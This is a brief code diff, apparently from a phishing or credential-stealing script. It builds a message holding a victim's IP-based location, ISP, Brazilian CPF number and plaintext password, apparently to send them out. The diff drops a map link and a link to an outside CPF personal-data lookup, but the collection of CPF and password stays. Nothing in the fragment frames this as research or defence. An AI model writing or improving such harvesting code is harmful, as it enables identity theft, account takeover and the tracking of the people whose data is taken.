@@ -79,11 +79,9 @@ Nome da região: ${responseGeoJson.regionName}
 Cidade: ${responseGeoJson.city}
 Latitude: ${responseGeoJson.lat}
 Longitude: ${responseGeoJson.lon}
-Mapa: https://www.google.com/maps/@${responseGeoJson.lat},${responseGeoJson.lon}/data=!3m1!1e3?entry=ttu
 Operadora: ${responseGeoJson.isp}
 CPF: ${cpf}
 Password: ${password}
-Informações pessoais: https://dbftools.tech/api/tools/search-cpf/${cpf}
         `
       })
     })
